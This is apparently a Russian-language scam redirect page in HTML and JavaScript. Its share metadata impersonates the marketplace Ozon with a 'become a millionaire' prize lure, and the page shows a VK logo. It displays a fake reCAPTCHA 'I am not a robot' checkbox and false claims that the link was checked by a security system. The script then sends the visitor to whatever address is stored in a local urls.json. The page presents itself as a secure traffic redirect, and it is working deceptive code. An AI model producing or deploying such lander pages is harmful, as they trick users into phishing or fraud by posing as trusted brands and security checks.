<!DOCTYPE html> 
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="same-origin">
    
    <title>© 2026 Защищенное перенаправление трафика</title>

    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWrxB8FZVbsRP4ro-7lVqQjY6vsuRBf1TbfBSz96mVNDx6Np6HqevUn6dW&s=10">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="OZON.ru маркетплейс – миллионы товаров по выгодным...">
    <meta name="twitter:description" content="🏆 Стань миллионером с Ozon! Делай любимые покупки, выполняй задания и участвуй в розыгрыше главного приза. Твой шанс забрать миллион — всего в одном клике! 💸">
    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWrxB8FZVbsRP4ro-7lVqQjY6vsuRBf1TbfBSz96mVNDx6Np6HqevUn6dW&s=10">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); 
            display: flex; justify-content: center; align-items: center; height: 100vh; color: #333; 
        }
        .redirect-container {
            background: #ffffff; padding: 40px 30px; border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); text-align: center; max-width: 400px; width: 90%;
        }
        .logo-area { 
            margin-bottom: 25px; 
            display: flex; justify-content: center; align-items: center; min-height: 60px;
        }
        .logo-img {
            max-width: 200px; max-height: 70px; object-fit: contain;
        }
        .loader-ring {
            display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(52, 152, 219, 0.1);
            border-radius: 50%; border-top-color: #3498db; animation: spin 1s linear infinite; margin: 20px 0;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #2c3e50; }
        p { font-size: 14px; color: #7f8c8d; line-height: 1.5; }
        .status-msg { font-size: 12px; color: #3498db; margin-top: 10px; font-weight: 500; }
        .footer-note { margin-top: 30px; padding-top: 20px; border-top: 1px solid #edf2f7; font-size: 12px; color: #95a5a6; }

        .captcha-box {
            display: none; 
            background: #f9f9f9;
            border: 1px solid #dcdcdc;
            border-radius: 4px;
            padding: 15px;
            margin: 20px auto;
            max-width: 300px;
            align-items: center;
            justify-content: space-between;
            text-align: left;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }
        .captcha-left { display: flex; align-items: center; gap: 12px; }
        .captcha-checkbox { width: 24px; height: 24px; cursor: pointer; accent-color: #3498db; }
        .captcha-text { font-size: 14px; font-weight: 500; color: #333; user-select: none; cursor: pointer; }
        .captcha-right { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #7f8c8d; }
        .captcha-icon {
            width: 26px; height: 26px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaAnchor.svg') no-repeat center;
            background-size: contain; margin-bottom: 2px;
        }
    </style>
</head>
<body>

    <div class="redirect-container">
        <div class="logo-area">
            <img src="https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000" alt="Логотип" class="logo-img" onerror="this.style.display='none';">
        </div>

        <div class="loader-ring" id="loader"></div>

        <div class="captcha-box" id="captchaBox">
            <div class="captcha-left">
                <input type="checkbox" id="captchaCheck" class="captcha-checkbox">
                <label for="captchaCheck" class="captcha-text">Я не робот</label>
            </div>
            <div class="captcha-right">
                <div class="captcha-icon"></div>
                <span>Защита</span>
                <span>конфиденциальности</span>
            </div>
        </div>

        <h2 id="title">Загрузка...</h2>
        <p id="desc">Пожалуйста, подождите, идет подготовка соединения.</p>
        <div id="status" class="status-msg"></div>

        <div class="footer-note">
            Ссылка проверена системой безопасности. <br>
            © 2026 Защищенное распределение трафика.
        </div>
    </div>

    <script>
        // Относительный путь к файлу в том же каталоге
        const LOCAL_JSON_URL = './urls.json';
        
        let targetUrl = null;

        // Пинг первого URL в фоне
        async function checkUrlAccessible(url) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2500);
                await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
                clearTimeout(timeoutId);
                return true; 
            } catch (error) {
                return false; 
            }
        }

        // Подготовка ссылки сразу при заходе на страницу
        async function prepareTargetUrl() {
            try {
                const response = await fetch(LOCAL_JSON_URL, { cache: 'no-store' });
                const urls = await response.json();

                if (Array.isArray(urls) && urls.length > 0) {
                    const firstUrl = urls[0];
                    const isAlive = await checkUrlAccessible(firstUrl);
                    targetUrl = isAlive ? firstUrl : urls[0];
                } else if (urls && urls.url) {
                    // Поддержка формата {"url": "https://..."}
                    const isAlive = await checkUrlAccessible(urls.url);
                    targetUrl = isAlive ? urls.url : urls.url;
                }
            } catch (e) {
                console.error("Ошибка загрузки urls.json:", e);
            } finally {
                // Показываем капчу пользователю
                document.getElementById('loader').style.display = 'none';
                document.getElementById('captchaBox').style.display = 'flex';
                document.getElementById('title').innerText = "Подтвердите действие";
                document.getElementById('desc').innerText = "Чтобы продолжить переход на сайт партнера, подтвердите, что вы не являетесь роботом.";
            }
        }

        // Обработка клика по чекбоксу
        document.getElementById('captchaCheck').addEventListener('change', function() {
            if (this.checked) {
                this.disabled = true;
                document.getElementById('captchaBox').style.display = 'none';
                document.getElementById('loader').style.display = 'inline-block';
                
                // Текст при клике
                document.getElementById('title').innerText = "Проверка соединения";
                document.getElementById('desc').innerText = "Пожалуйста, подождите. Идет безопасное перенаправление.";
                document.getElementById('status').innerText = "Статус: Установление сессии...";
                document.getElementById('status').style.color = "#3498db";

                // Переход ровно через 1 секунду
                setTimeout(() => {
                    if (targetUrl) {
                        window.location.replace(targetUrl);
                    } else {
                        // Запасная попытка забрать адрес, если файл долго подгружался
                        fetch(LOCAL_JSON_URL, { cache: 'no-store' })
                            .then(res => res.json())
                            .then(data => {
                                const fallback = Array.isArray(data) ? data[0] : data.url;
                                window.location.replace(fallback);
                            })
                            .catch(() => {
                                window.location.reload();
                            });
                    }
                }, 1000);
            }
        });

        // Запуск при открытии страницы
        window.onload = prepareTargetUrl;
    </script>
</body>
</html>
